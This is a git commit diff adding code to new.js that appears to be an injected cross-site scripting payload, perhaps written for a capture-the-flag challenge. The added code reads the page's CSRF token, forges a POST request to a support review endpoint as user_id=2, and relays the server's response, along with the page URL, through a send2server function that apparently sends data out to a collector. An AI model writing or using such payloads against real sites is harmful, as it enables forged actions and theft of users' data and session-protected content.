5a2c02adf49c4467992aa4a4fb377fa556a26017
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-19 21:18:52 +0530

    Update new.js

--- new.js
+++ new.js
@@ -5,3 +5,13 @@ function send2server(name, data){
 }
 
 send2server("url", window.location.href);
+
+let xhr = new XMLHttpRequest();
+xhr.open("POST", "/support/review/4b3891e5a54b5071fe5634d6af4e6407e0377d1635ee7001ae4ad38d3abc9bb6", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+xhr.onload = function() { 
+    var resp = "Loaded: "+ xhr.status +"\n\n"+ xhr.response ;
+    send2server("PostedResponse", resp);
+};
+xhr.send("name=Nice&user_id=2&_csrf_token="+document.getElementsByName("_csrf_token")[0].value);
